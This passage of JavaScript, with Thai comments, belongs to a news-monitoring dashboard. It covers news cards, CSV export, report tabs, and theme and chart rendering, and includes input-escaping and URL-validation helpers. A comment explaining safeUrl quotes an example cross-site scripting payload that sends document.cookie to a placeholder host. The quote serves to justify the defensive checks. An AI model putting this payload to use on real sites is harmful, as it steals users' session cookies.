    // ⚠️ ถอด class attention-1/2/3 ออก 2 ส.ค. 69 — แถบสีซ้ายการ์ดระดับ 3 ใช้ #E05C5C
    //    ซึ่งเป็นสีเดียวกับข่าวลบเป๊ะ ทำให้แยกไม่ออกว่าการ์ดแดงแปลว่า "ร้อน" หรือ "ลบ"
    //    ตอนนี้ป้ายไฟใช้สีกลาง จำนวนไฟยังบอกระดับได้เหมือนเดิม
    var hotBadge = '';
    if (t.count >= 10) hotBadge = '🔥🔥🔥';
    else if (t.count >= 5) hotBadge = '🔥🔥';
    else if (t.count >= 3) hotBadge = '🔥';
    var hotBadgeHtml = hotBadge
      ? '<span class="hot-badge" title="นำเสนอ ' + t.count + ' ครั้ง">' + hotBadge + '</span>'
      : '';

    // ⭐ แก้ 4 ส.ค. 69 (R11): เดิมยัด s.url ดิบ ๆ ลง href โดยไม่ escape และไม่ตรวจ scheme
    //    ลิงก์ที่ scheme ไม่ใช่ http/https จะไม่ถูกทำเป็นลิงก์ แต่ยังแสดงชื่อสำนักให้เห็นว่ามีข่าวนี้อยู่
    //    เพิ่ม noreferrer คู่กับ noopener ด้วย — กันไม่ให้ปลายทางเห็นว่ามาจากหน้าไหน
    var sourcesHtml = t.sources.slice(0, 5).map(function (s) {
      var href = safeUrl(s.url);
      if (!href) {
        return '<span class="src-broken" title="ลิงก์ต้นทางไม่ถูกต้อง จึงกดไม่ได้">🔗 ' +
               escapeHtml(s.source) + '</span>';
      }
      return '<a href="' + escapeAttr(href) + '" target="_blank" rel="noopener noreferrer">🔗 ' +
             escapeHtml(s.source) + '</a>';
    }).join('');
    if (t.sources.length > 5) {
      sourcesHtml += '<span class="more-sources">และอีก ' + (t.sources.length - 5) + ' แหล่ง</span>';
    }

    var srcCount = uniqueSourceCount(t);
    var metaText = formatThaiDate(new Date(t.earliestDate)) + ' · นำเสนอ ' + t.count + ' ครั้ง · ' + srcCount + ' สำนักข่าว';

    // เนื้อหาย่อ: ตัดแสดง 5 บรรทัด (CSS line-clamp) ถ้ายาวเกิน ~180 ตัวอักษร แสดงปุ่ม "อ่านเพิ่ม"
    var summaryText = t.summary || '';
    var summaryHtml = '<p class="summary">' + escapeHtml(summaryText) + '</p>';
    if (summaryText.length > 180) {
      summaryHtml += '<button type="button" class="read-more" onclick="toggleSummary(this)">อ่านเพิ่ม ▾</button>';
    }

    // ⭐ แท็กข่าวลบ — วางไว้ "ล่างการ์ด" ตามที่ออกแบบไว้ คู่กับกรอบการ์ดสีแดง
    //    ไม่ใช้อิโมจิมุมการ์ด เพราะกรอบแดงเห็นชัดจากระยะไกลอยู่แล้ว
    var negTagHtml = '';
    if (t.isNegative) {
      var impactText = (t.impact && t.impact !== '-') ? ' · ระดับ' + t.impact : '';
      var partial = (t.negCount < t.count) ? ' (' + t.negCount + '/' + t.count + ' ข่าว)' : '';
      negTagHtml = '<div class="neg-tag-row"><span class="badge neg-tag">ข่าวลบ' + impactText + partial + '</span></div>';
    }

    return '<div class="news-card' + (t.isNegative ? ' is-negative' : '') + '">' +
      hotBadgeHtml + badges +
      '<p class="title">' + escapeHtml(t.title) + '</p>' +
      summaryHtml +
      '<p class="meta">' + metaText + '</p>' +
      '<div class="sources">' + sourcesHtml + '</div>' +
      negTagHtml +
      '</div>';
  }).join('');
}

// สลับย่อ/ขยายเนื้อหาย่อในการ์ดข่าว (เรียกจากปุ่ม "อ่านเพิ่ม")
function toggleSummary(btn) {
  var summary = btn.previousElementSibling;
  if (!summary || !summary.classList.contains('summary')) return;
  var expanded = summary.classList.toggle('expanded');
  btn.textContent = expanded ? 'ย่อ ▴' : 'อ่านเพิ่ม ▾';
}

/**
 * escape สำหรับ "ข้อความในเนื้อหา" (text node)
 * ⚠️ วิธี textContent → innerHTML แปลงให้แค่ & < > เท่านั้น ไม่แปลง " และ '
 *    จึงใช้ได้เฉพาะข้อความที่อยู่ระหว่างแท็ก ห้ามใช้กับค่าที่จะไปอยู่ใน attribute
 *    ถ้าจะใส่ใน attribute ให้ใช้ escapeAttr() ข้างล่างแทน
 */
function escapeHtml(str) {
  var div = document.createElement('div');
  div.textContent = (str === null || str === undefined) ? '' : str;
  return div.innerHTML;
}

/**
 * ⭐ เพิ่ม 4 ส.ค. 69 (R11) — escape สำหรับค่าที่จะไปอยู่ใน attribute
 * แปลงครบทั้ง 5 ตัวรวม " และ ' ซึ่งเป็นตัวที่ใช้ "แหกออกจาก attribute" ได้
 */
function escapeAttr(str) {
  return String((str === null || str === undefined) ? '' : str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/**
 * ⭐ เพิ่ม 4 ส.ค. 69 (R11) — ตรวจ scheme ของลิงก์ก่อนเอาไปใส่ href
 *
 * ทำไมต้องมี: URL ในชีตมาจากฟีดข่าวภายนอก และผ่าน decodeURIComponent มาก่อน
 * (%22 จึงกลายเป็น " ตัวจริงได้) ถ้าปล่อยเข้า href ตรง ๆ ค่าอย่าง
 *   x" onmouseenter="fetch('//evil/?c='+document.cookie)" x=
 * จะหลุดออกจาก attribute แล้วกลายเป็น event handler ที่รันได้จริง
 * ส่วน javascript: กับ data: เป็น scheme ที่รันโค้ดได้เมื่อคลิก จึงต้องปิดด้วย
 *
 * ยอมเฉพาะ http/https เท่านั้น — ข้อมูลจริง 4 ส.ค. 69: https 1,849 · http 2 · อื่น ๆ 0
 * คืนค่าว่างถ้าไม่ผ่าน แล้วให้ผู้เรียกแสดงเป็นข้อความธรรมดาแทนลิงก์
 */
function safeUrl(url) {
  var s = String((url === null || url === undefined) ? '' : url).trim();
  if (!/^https?:\/\/[^\s]/i.test(s)) return '';
  return s;
}

// ============================================================
// ส่งออก CSV (ข่าวดิบที่ผ่านตัวกรองปัจจุบัน)
// ============================================================
function exportCsv() {
  var rows = state.filteredNews;
  if (rows.length === 0) {
    alert('ไม่มีข้อมูลให้ส่งออกตามเงื่อนไขที่เลือกอยู่');
    return;
  }

  // ⚠️ ถอดคอลัมน์ "ไทย-กัมพูชา" ออก 2 ส.ค. 69 — ซ้ำ 100% กับคอลัมน์ "หมวด" โดยนิยาม
  //    (ตั้งแต่เปลี่ยนให้คำนวณจากหมวดแทนคอลัมน์ K ที่เลิกใช้แล้ว)
  var headers = ['วันที่เวลา', 'หัวข้อ', 'แหล่งที่มา', 'หมวด', 'ข่าวลบ', 'ระดับผลกระทบ', 'ลิงก์'];
  var lines = [headers.join(',')];

  rows.forEach(function (n) {
    var cells = [
      n.datetime, n.title, n.source, n.category,
      n.isNegative ? 'ลบ' : 'ไม่ลบ', n.impact || '-', n.url
    ].map(csvEscape);
    lines.push(cells.join(','));
  });

  var csvContent = '\uFEFF' + lines.join('\r\n');
  var blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a');
  a.href = url;
  a.download = 'army-news-export-' + new Date().toISOString().slice(0, 10) + '.csv';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function csvEscape(value) {
  var s = (value === null || value === undefined) ? '' : String(value);
  if (/[",\r\n]/.test(s)) {
    s = '"' + s.replace(/"/g, '""') + '"';
  }
  return s;
}

// ============================================================
// ล้างตัวกรองทั้งหมด
// ============================================================
function clearAllFilters() {
  document.getElementById('searchInput').value = '';
  document.getElementById('dateFrom').value = '';
  document.getElementById('dateTo').value = '';
  document.getElementById('onlyToday').checked = false;
  document.getElementById('onlyLast3Days').checked = false;
  document.getElementById('onlyNegative').checked = false;

  state.selectedCategories.clear();
  state.selectedSources.clear();
  document.querySelectorAll('#categoryPanel input[type=checkbox]').forEach(function (cb) { cb.checked = false; });
  document.querySelectorAll('#sourcePanel input[type=checkbox]').forEach(function (cb) { cb.checked = false; });
  updateMultiselectUI('category', 'categoryMultiselect', 'categoryToggle', 'categoryPanel', 'ทุกหมวด');
  updateMultiselectUI('source', 'sourceMultiselect', 'sourceToggle', 'sourcePanel', 'ทุกสำนักข่าว');

  applyFiltersAndRender();
}

// ============================================================
// ผูก event listener
// ============================================================
['searchInput', 'dateFrom', 'dateTo', 'onlyToday', 'onlyLast3Days', 'onlyNegative', 'sortOrder']
  .forEach(function (id) {
    var el = document.getElementById(id);
    el.addEventListener('input', applyFiltersAndRender);
    el.addEventListener('change', applyFiltersAndRender);
  });

document.getElementById('exportBtn').addEventListener('click', exportCsv);
document.getElementById('clearFiltersBtn').addEventListener('click', clearAllFilters);

// ============================================================
// แท็บสลับ: รายการข่าว / กราฟสรุป
// ============================================================
var chartsRendered = false;

// ⭐ แก้ 13 ส.ค. 69 — เดิมเขียนแบบ "ไม่ใช่ list ก็คือ charts" (isList / !isList)
//    พอมีแท็บที่ 3 ตรรกะแบบนั้นพังทันที จึงเปลี่ยนเป็นตารางแท็บ
//    เพิ่มแท็บที่ 4 ในอนาคตทำได้โดยเติมบรรทัดเดียว ไม่ต้องแก้ตรรกะอีก
var TABS = [
  { key: 'list',   view: 'listView',   btn: 'tabListBtn' },
  { key: 'charts', view: 'chartsView', btn: 'tabChartsBtn' },
  { key: 'cycles', view: 'cyclesView', btn: 'tabCyclesBtn' }
];

function switchTab(tab) {
  var known = false;
  TABS.forEach(function (t) { if (t.key === tab) known = true; });
  if (!known) tab = 'list';

  TABS.forEach(function (t) {
    var v = document.getElementById(t.view);
    var b = document.getElementById(t.btn);
    if (v) v.style.display = (t.key === tab) ? '' : 'none';
    if (b) b.classList.toggle('active', t.key === tab);
  });

  // วาดกราฟครั้งแรกที่เปิดแท็บกราฟเท่านั้น (ของเดิม ไม่เปลี่ยนพฤติกรรม)
  if (tab === 'charts' && !chartsRendered) {
    renderCharts();
    chartsRendered = true;
  }
  // โหลดดัชนีรายงานครั้งแรกที่เปิดแท็บวงรอบเท่านั้น — ไม่ถ่วงเวลาเปิดหน้าครั้งแรก
  if (tab === 'cycles' && !cyclesLoaded) {
    cyclesLoaded = true;
    loadCycles();
  }
}

document.getElementById('tabListBtn').addEventListener('click', function () { switchTab('list'); });
document.getElementById('tabChartsBtn').addEventListener('click', function () { switchTab('charts'); });
document.getElementById('tabCyclesBtn').addEventListener('click', function () {
  switchTab('cycles');
  if (history.replaceState) history.replaceState(null, '', '#cycles');
});

// ============================================================
// 🗓️ แท็บสรุปข่าวตามวงรอบ — เพิ่ม 13 ส.ค. 69 (ขั้นที่ 1)
//
// อ่าน data/reports.json (ดัชนี) แล้ววาดการ์ดลิงก์ไปหน้ารายงานในโฟลเดอร์ reports/
// 🔴 ดัชนีต้องเล็กเสมอ — ห้ามเอาเนื้อรายงานมาใส่ (เหตุผลอยู่ในหมายเหตุ index.html)
// ⚠️ ค่าทุกตัวผ่าน escapeHtml/escapeAttr ตามกฎ R11 แม้ตอนนี้ไฟล์จะมาจากเว็บเราเอง
//    เพราะขั้นที่ 2 ดัชนีจะถูกสร้างจากข้อมูลในชีต = กลายเป็นค่าจากภายนอกทันที
// ============================================================
var cyclesLoaded = false;
var cyclesData = [];
var cyclesType = 'all';
// ⭐ 14 ส.ค. 69 — แบ่งหน้า: รายงานรายวันเพิ่มปีละ ~365 ฉบับ
//    วาดทีละ CYC_PAGE ใบ ที่เหลือรอปุ่ม "ดูเพิ่ม" (ข้อมูลอยู่ครบเสมอ ไม่ได้ตัดทิ้ง)
var CYC_PAGE = 20;
var cyclesShown = CYC_PAGE;

async function loadCycles() {
  var grid = document.getElementById('cyclesGrid');
  try {
    var res = await fetch('data/reports.json', { cache: 'no-store' });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    var json = await res.json();
    cyclesData = (json && json.reports) ? json.reports : [];
    renderCycles();
  } catch (err) {
    // ⚠️ แยก 2 กรณีให้ชัด — "ยังไม่มีไฟล์ดัชนี" ไม่ใช่ความผิดพลาด แต่ "โหลดแล้วพัง" คือ
    //    ถ้ากลบรวมกันหมด วันที่ไฟล์เสียจริงเราจะไม่มีทางรู้เลย
    var notFound = /HTTP 404/.test(String(err && err.message));
    grid.innerHTML = notFound
      ? '<div class="empty">ยังไม่มีรายงานในระบบ' +
        '<br><span class="empty-sub">รายงานฉบับแรกจะปรากฏที่นี่เมื่อระบบจัดทำเสร็จ</span></div>'
      : '<div class="empty">โหลดรายการรายงานไม่สำเร็จ: ' + escapeHtml(err && err.message) +
        '<br><span class="empty-sub">ลองรีเฟรชหน้าอีกครั้ง — ถ้ายังไม่หายแปลว่าไฟล์ดัชนีมีปัญหา</span></div>';
  }
}

function cycTypeLabel(t) {
  if (t === 'daily') return 'รายวัน';
  if (t === 'weekly') return 'รายสัปดาห์';
  if (t === 'monthly') return 'รายเดือน';
  return 'รายงาน';
}

/** ป้ายเพิ่ม/ลด — ใช้ลูกศรด้วยเสมอ ไม่พึ่งสีอย่างเดียว */
function cycDelta(n, unit, invert) {
  if (n === null || n === undefined || n === 0 || isNaN(n)) return '';
  var up = n > 0;
  var good = invert ? !up : up;   // invert = ตัวเลขที่ "ขึ้น = แย่" เช่นสัดส่วนข่าวลบ
  return '<span class="' + (good ? 'cyc-good' : 'cyc-bad') + '">' +
         (up ? '▲' : '▼') + Math.abs(n) + (unit || '') + '</span>';
}

function renderCycles() {
  var grid = document.getElementById('cyclesGrid');
  var moreBtn = document.getElementById('cyclesMoreBtn');
  var countEl = document.getElementById('cyclesCount');
  var list = cyclesData.filter(function (r) {
    return cyclesType === 'all' || r.type === cyclesType;
  });

  // ใหม่สุดขึ้นก่อนเสมอ — เรียงตามวันสิ้นสุดวงรอบ (รูปแบบ YYYY-MM-DD เทียบสตริงได้ตรง)
  // เสมอกัน (รายวันกับรายสัปดาห์จบวันเดียวกันได้) → เอารายสัปดาห์ขึ้นก่อน เพราะครอบคลุมกว่า
  var ORDER = { monthly: 0, weekly: 1, daily: 2 };
  list.sort(function (a, b) {
    return String(b.to).localeCompare(String(a.to)) ||
           ((ORDER[a.type] == null ? 9 : ORDER[a.type]) - (ORDER[b.type] == null ? 9 : ORDER[b.type]));
  });

  if (!list.length) {
    grid.innerHTML = '<div class="empty">ยังไม่มีรายงานชนิดนี้</div>';
    if (moreBtn) moreBtn.style.display = 'none';
    if (countEl) countEl.textContent = '';
    return;
  }

  var page = list.slice(0, cyclesShown);

  // 🔴 บอกจำนวนที่ "ยังไม่ได้วาด" ให้ชัด — ผู้อ่านต้องไม่เข้าใจผิดว่ารายงานเก่าหายไป
  if (countEl) {
    countEl.textContent = page.length < list.length
      ? 'แสดง ' + page.length + ' จาก ' + list.length + ' ฉบับ (ฉบับเก่ากว่านี้ยังอยู่ครบ กด "ดูเพิ่ม" ด้านล่าง)'
      : 'ทั้งหมด ' + list.length + ' ฉบับ';
  }
  if (moreBtn) {
    if (page.length < list.length) {
      var rest = list.length - page.length;
      moreBtn.textContent = 'ดูเพิ่มอีก ' + Math.min(CYC_PAGE, rest) + ' ฉบับ (เหลือ ' + rest + ')';
      moreBtn.style.display = '';
    } else {
      moreBtn.style.display = 'none';
    }
  }

  grid.innerHTML = page.map(function (r) {
    var st = r.stats || {};
    var href = safeRelUrl(r.url);
    var isDaily = r.type === 'daily';
    var mock = r.isMockup ? '<span class="badge cyc-mock">ตัวอย่าง</span>' : '';
    var hi = (r.highlights || []).slice(0, 3).map(function (x) {
      return '<li>' + escapeHtml(x) + '</li>';
    }).join('');

    // ☀️ การ์ดรายวันมีช่องที่ 4 = จำนวนประเด็นที่ต้องเฝ้า ซึ่งเป็นตัวเลขที่คนอ่านตอนเช้าสนใจที่สุด
    var wc = (st.watchCount != null)
      ? '<div><span class="n' + (st.watchCount > 0 ? ' warn' : '') + '">' +
        escapeHtml(String(st.watchCount)) + '</span><span class="l">เฝ้าติดตาม</span></div>' : '';

    var body =
      '<div class="cyc-head">' +
        '<span class="badge' + (isDaily ? ' cyc-d' : '') + '">' + escapeHtml(cycTypeLabel(r.type)) + '</span>' +
        (r.no ? '<span class="badge">ฉบับที่ ' + escapeHtml(String(r.no)) + '</span>' : '') +
        mock +
      '</div>' +
      '<p class="cyc-period">' + escapeHtml(r.periodLabel || '') + '</p>' +
      '<div class="cyc-nums">' +
        '<div><span class="n">' + escapeHtml(String(st.news != null ? st.news : '-')) + '</span>' +
          '<span class="l">ข่าว ' + cycDelta(st.newsDelta, '') + '</span></div>' +
        '<div><span class="n">' + escapeHtml(String(st.topics != null ? st.topics : '-')) + '</span>' +
          '<span class="l">ประเด็น</span></div>' +
        '<div><span class="n neg">' + escapeHtml(String(st.neg != null ? st.neg : '-')) + '</span>' +
          '<span class="l">ข่าวลบ ' + cycDelta(st.negPctDelta, '%', true) + '</span></div>' +
        wc +
      '</div>' +
      (r.topCat ? '<p class="cyc-top">หมวดที่ข่าวลบมากที่สุด · ' + escapeHtml(r.topCat) + '</p>' : '') +
      (hi ? '<p class="cyc-hl-l">' + (isDaily ? 'ประเด็นที่ต้องเฝ้าติดตาม' : 'ประเด็นเด่น') +
            '</p><ul class="cyc-hl">' + hi + '</ul>' : '');

    if (!href) {
      return '<div class="cyc-card">' + body +
        '<p class="cyc-open cyc-err">⚠️ ลิงก์รายงานไม่ถูกต้อง — เปิดไม่ได้</p></div>';
    }
    // ⭐ 13 ส.ค. 69 — เปิดแท็บใหม่ตามคำสั่งเจ้าของระบบ (แดชบอร์ดยังค้างอยู่ ไม่เสียตัวกรองที่ตั้งไว้)
    //    rel="noopener" จำเป็นเสมอเมื่อใช้ target=_blank — กันหน้าที่เปิดใหม่เข้าถึง window.opener
    //    บอกผู้ใช้ด้วยข้อความ "เปิดแท็บใหม่" ไม่ใช่ให้เดาเอง (ผู้ใช้ที่กดแล้วแท็บเด้งโดยไม่รู้ตัวจะสับสน)
    return '<a class="cyc-card" href="' + escapeAttr(href) + '" target="_blank" rel="noopener">' + body +
      '<p class="cyc-open">อ่านฉบับเต็ม <span class="cyc-nt">↗ เปิดแท็บใหม่</span></p></a>';
  }).join('');
}

/**
 * ตรวจลิงก์ในดัชนี — ยอมเฉพาะ path สัมพัทธ์ภายในเว็บเราเอง
 *
 * ทำไมไม่ใช้ safeUrl() ที่มีอยู่: ตัวนั้นออกแบบไว้สำหรับลิงก์ข่าวภายนอก (ยอม http/https)
 * แต่ลิงก์ในดัชนีต้องชี้เข้าไฟล์ในเว็บเราเท่านั้น การยอม https จะเปิดช่องให้ดัชนีที่ถูก
 * แก้ไข พาผู้อ่านออกไปเว็บอื่นโดยที่หน้าตายังดูเหมือนรายงานของเราทุกประการ
 * (ยิ่งสำคัญขึ้นเมื่อเปิดแท็บใหม่ — ผู้อ่านเห็นแถบที่อยู่ของแท็บใหม่น้อยกว่าแท็บเดิม)
 */
function safeRelUrl(u) {
  var s = String(u || '').trim();
  if (!s) return '';
  if (/^[a-zA-Z][a-zA-Z0-9+.\-]*:/.test(s)) return '';   // มี scheme = ไม่ใช่ path ในเว็บเรา
  if (s.charAt(0) === '/' || s.indexOf('//') === 0) return '';
  if (s.indexOf('..') !== -1) return '';                   // กันไต่ออกนอกโฟลเดอร์
  return s;
}

document.querySelectorAll('.cyc-btn').forEach(function (b) {
  b.addEventListener('click', function () {
    cyclesType = b.getAttribute('data-cyctype') || 'all';
    cyclesShown = CYC_PAGE;          // 🔴 เปลี่ยนตัวกรอง = เริ่มนับหน้าใหม่ ไม่งั้นจะค้างที่จำนวนของชนิดก่อน
    document.querySelectorAll('.cyc-btn').forEach(function (x) {
      x.classList.toggle('active', x === b);
    });
    renderCycles();
  });
});

(function () {
  var mb = document.getElementById('cyclesMoreBtn');
  if (!mb) return;
  mb.addEventListener('click', function () {
    cyclesShown += CYC_PAGE;
    renderCycles();
    // เลื่อนไปที่ใบแรกของชุดใหม่ ไม่ให้ผู้อ่านหลงว่ากดแล้วไม่มีอะไรเกิดขึ้น
    var cards = document.querySelectorAll('#cyclesGrid .cyc-card');
    var target = cards[Math.max(0, cyclesShown - CYC_PAGE)];
    if (target && target.scrollIntoView) target.scrollIntoView({ block: 'center' });
  });
})();

// เปิดหน้าด้วย #cycles (ปุ่ม "ปิดหน้านี้" ในรายงานถอยมาที่นี่เมื่อปิดแท็บไม่ได้)
if (location.hash === '#cycles') switchTab('cycles');

// ============================================================
// ปรับขนาดตัวอักษร (ช่วยผู้ที่มีปัญหาด้านสายตา)
//  - ข้อความทั้งหน้าใช้หน่วย rem จึงขยายตาม font-size ของ <html>
//  - ตัวอักษรในกราฟ Chart.js เป็น px จึงต้องคูณสเกลเองแล้ววาดกราฟใหม่
// ============================================================
var FONT_SCALE_KEY = 'dashboardFontScale';
var fontScale = 1;

/** คืนขนาดฟอนต์สำหรับกราฟตามสเกลปัจจุบัน */
function cfs(base) {
  return Math.round(base * fontScale);
}

function applyFontScale(scale, save) {
  fontScale = parseFloat(scale) || 1;
  document.documentElement.style.fontSize = Math.round(100 * fontScale) + '%';

  var btns = document.querySelectorAll('.fontsize-btn');
  for (var i = 0; i < btns.length; i++) {
    var isActive = parseFloat(btns[i].getAttribute('data-fontscale')) === fontScale;
    btns[i].classList.toggle('active', isActive);
    btns[i].setAttribute('aria-pressed', isActive ? 'true' : 'false');
  }

  if (save) {
    try { localStorage.setItem(FONT_SCALE_KEY, String(fontScale)); } catch (e) { /* เบราว์เซอร์ปิด storage ก็ยังใช้งานได้ปกติ */ }
  }

  if (chartsRendered) renderCharts(); // วาดกราฟใหม่ให้ตัวอักษรในกราฟขยายตาม
}

function initFontScale() {
  var saved = 1;
  try { saved = parseFloat(localStorage.getItem(FONT_SCALE_KEY)) || 1; } catch (e) { saved = 1; }
  applyFontScale(saved, false);

  var btns = document.querySelectorAll('.fontsize-btn');
  for (var i = 0; i < btns.length; i++) {
    btns[i].addEventListener('click', function () {
      applyFontScale(this.getAttribute('data-fontscale'), true);
    });
  }
}

initFontScale();

// ============================================================
// สลับโหมดมืด/สว่าง
//  - ค่าตั้งต้นและการกันจอกระพริบ ทำโดยสคริปต์ inline ใน <head> ของ index.html
//    ไฟล์นี้รับหน้าที่เฉพาะ "ปุ่มกด" กับ "จำค่า" เท่านั้น
//  - ⚠️ ต้องวาดกราฟใหม่ทุกครั้งที่สลับ เพราะ Chart.js อ่านสีตอนสร้างครั้งเดียว
//    ถ้าไม่วาดใหม่ กราฟจะค้างสีของโหมดเดิมทั้งที่หน้าเว็บเปลี่ยนไปแล้ว
// ============================================================
var THEME_KEY = 'dashboardTheme';

function currentTheme() {
  return document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'light';
}

function applyTheme(theme, save) {
  var t = (theme === 'dark') ? 'dark' : 'light';
  document.documentElement.setAttribute('data-theme', t);

  var btn = document.getElementById('themeBtn');
  if (btn) {
    btn.textContent = (t === 'dark') ? '☀️ โหมดสว่าง' : '🌙 โหมดมืด';
    btn.setAttribute('title', (t === 'dark') ? 'เปลี่ยนเป็นโหมดสว่าง' : 'เปลี่ยนเป็นโหมดมืด');
  }

  if (save) {
    try { localStorage.setItem(THEME_KEY, t); } catch (e) { /* เบราว์เซอร์ปิด storage ก็ยังใช้งานได้ปกติ */ }
  }

  if (chartsRendered) renderCharts();
}

function initTheme() {
  applyTheme(currentTheme(), false);
  var btn = document.getElementById('themeBtn');
  if (btn) {
    btn.addEventListener('click', function () {
      applyTheme(currentTheme() === 'dark' ? 'light' : 'dark', true);
    });
  }
}

initTheme();

// ============================================================
// กราฟสรุป — คำนวณจากข้อมูลทั้งหมด (ไม่ผูกกับตัวกรองของแท็บรายการข่าว)
// ============================================================
/**
 * ชุดสีของกราฟ — อ่านสดจากโทเคน CSS ทุกครั้งที่วาด
 * ⚠️ ห้ามเก็บผลลัพธ์ไว้ในตัวแปรระดับไฟล์ ต้องเรียกใหม่ทุกครั้งที่วาดกราฟ
 *    ไม่งั้นพอสลับโหมดมืด/สว่าง กราฟจะยังใช้สีของโหมดเดิม
 * 🔑 ความหมายของแต่ละสี — ยกเครื่อง 4 ส.ค. 69 ให้ใช้ชุดเดียวกันทุกกราฟ
 *    neg  = ข่าวลบ        (แดง Alert — ใช้กับข่าวลบเท่านั้น)
 *    main = ไทย-กัมพูชา   (เหลือง Sand — สงวนไว้ให้ความหมายนี้เท่านั้น)
 *    soft = ข่าวอื่นๆ     (เขียว — สว่าง Pine / มืด Jade 60%)
 *
 * ⚠️ ของเดิมกราฟ "หมวดข่าว" ใช้ main (เหลือง) แทน "ข่าวไม่ลบ"
 *    ทำให้สีเหลืองมี 2 ความหมายในหน้าเดียวกัน — ผู้ใช้จับได้เอง 4 ส.ค.
 *    ตอนนี้กราฟหมวดข่าวไม่ใช้เหลืองเลย เพราะกราฟนั้นไม่มีมิติไทย-กัมพูชา
 *    (ชายแดนไทย-กัมพูชาเป็น 1 ในแถวอยู่แล้ว ถ้าแยกอีกจะนับซ้อน)
 *
 * ⚠️ คำในคำอธิบายกราฟต้องเป็น "ข่าวลบ / ไทย-กัมพูชา / ข่าวอื่นๆ" เท่านั้น
 *    ห้ามกลับไปใช้ "ข่าวไม่ลบ" หรือ "ข่าวทั่วไป" อีก
 */
function chartColors() {
  return {
    neg: cssVar('--chart-neg'),
    main: cssVar('--chart-main'),
    soft: cssVar('--chart-soft'),
    text: cssVar('--text'),
    muted: cssVar('--text-secondary'),
    grid: cssVar('--grid'),
    card: cssVar('--surface'),
    // เส้นขอบท่อนแท่งซ้อน — ดูเหตุผลที่ barSeparator()
    segLine: cssVar('--seg-line')
  };
}

/**
 * เส้นคั่นระหว่างท่อนของแท่งซ้อน — ใช้สีเดียวกับพื้นการ์ด จึงเห็นเป็น "ร่องว่าง"
 *
 * ⚠️ จำเป็น ไม่ใช่ของตกแต่ง — พิสูจน์ด้วยเลขแล้วว่าเลี่ยงไม่ได้
 *    เกณฑ์ WCAG อยากให้สีที่อยู่ติดกันต่างกัน 3:1 แต่ท่อนทั้ง 3 ก็ต้องต่างจาก
 *    พื้นการ์ด 3:1 ด้วย ซึ่งบีบให้ความสว่างต้องอยู่ในช่วง <= 0.175 (บนพื้นขาว)
 *    พอบีบแบบนั้น สีที่สามจะต้องมีความสว่างติดลบ = ไม่มีสีไหนในโลกทำได้
 *    ทางออกมาตรฐานคือใส่เส้นคั่น ให้ "ขอบ" เป็นตัวแยกแทน "สี"
 *
 * ⚠️ ต้องมี borderSkipped: false ไม่งั้น Chart.js จะไม่วาดขอบด้านที่ติดกับท่อนอื่น
 *    ซึ่งเป็นด้านเดียวที่เราต้องการพอดี
 */
function barSeparator(c) {
  // ⚠️ เปลี่ยนจากสีการ์ดเป็น --seg-line (3 ส.ค. 69 · ธีม RTA)
  //    โหมดสว่าง  --seg-line = green-50 #88908B → เป็น "เส้นขอบ" จริง
  //      จำเป็นเพราะแท่ง Sand #FCE375 ได้ contrast กับพื้นการ์ดขาวแค่ 1.28:1
  //      ถ้าไม่มีขอบ แท่งไทย-กัมพูชาจะจมหายไปกับพื้นการ์ด
  //    โหมดมืด    --seg-line = สีการ์ด #10402E → เห็นเป็น "ร่องว่าง" เหมือนเดิม
  //      (โหมดมืดแท่งทุกสีผ่าน 3:1 กับพื้นการ์ดอยู่แล้ว ไม่ต้องมีขอบ)
  //    ทำให้ใช้โค้ดเส้นทางเดียว แก้สีที่โทเคนอย่างเดียวจบ
  return { borderColor: c.segLine, borderWidth: 1.5, borderSkipped: false };
}

function renderCharts() {
  // ทำลายกราฟเดิมก่อนวาดใหม่ (เช่น ตอนเปลี่ยนขนาดตัวอักษร หรือสลับโหมดสี) กันกราฟซ้อนทับกัน
  ['categoryBar', 'sourceBar', 'trendBar'].forEach(function (id) {
    var existing = Chart.getChart(id);
    if (existing) existing.destroy();
  });

  var allTopics = groupIntoTopics(state.allNews);
  var last14DaysNews = getLast14DaysNews();

  renderChartStats(allTopics);
  renderCategoryBar(state.allNews);   // ⚠️ ส่ง "ข่าว" ไม่ใช่ "ประเด็น" — กราฟนี้นับรายข่าว
  renderSourceBar(last14DaysNews);
  renderTrendBar(state.allNews);
}

function getLast14DaysNews() {
  var cutoff = new Date();
  cutoff.setHours(0, 0, 0, 0);
  cutoff.setDate(cutoff.getDate() - 13); // วันนี้ + ย้อนหลัง 13 วัน = 14 วัน
  return state.allNews.filter(function (n) { return new Date(n.datetime) >= cutoff; });
}

function renderChartStats(allTopics) {
  // ⚠️ นับจากธง isNegative — เดิมนับด้วยหมวด ทำให้ข่าวลบเรื่องกัมพูชาตกหล่น 18%
  var negCount = allTopics.filter(function (t) { return t.isNegative; }).length;
  var camCount = allTopics.filter(function (t) { return t.category === 'ชายแดนไทย-กัมพูชา'; }).length;

  document.getElementById('chartStatGrid').innerHTML =
    '<div class="stat-card"><p class="label">ข่าวทั้งหมด</p><p class="value">' + state.allNews.length + '</p></div>' +
    '<div class="stat-card"><p class="label">ประเด็นทั้งหมด</p><p class="value accent">' + allTopics.length + '</p></div>' +
    '<div class="stat-card"><p class="label">ประเด็นข่าวลบ</p><p class="value negative">' + negCount + '</p></div>' +
    '<div class="stat-card"><p class="label">ประเด็นไทย-กัมพูชา</p><p class="value accent">' + camCount + '</p></div>';
}
/**
 * กราฟหมวดข่าว — แท่งแนวนอนซ้อน "ข่าวลบ + ข่าวอื่นๆ"
 *
 * ⚠️ เปลี่ยนจากโดนัทเป็นแท่งแนวนอน 2 ส.ค. 69 (เย็น)
 *    โดนัทบอกได้แค่ "หมวดไหนเยอะ" แต่บอกไม่ได้ว่า "หมวดไหนมีข่าวลบเยอะ"
 *    ซึ่งเป็นคำถามหลักของทีมโฆษก
 *
 * ⚠️ ซ้อน "ลบ + ไม่ลบ" ไม่ใช่ "ยอดรวม + ลบ"
 *    เพราะข่าวลบเป็นส่วนหนึ่งของยอดรวมอยู่แล้ว ถ้าซ้อนตรง ๆ จะนับซ้ำ
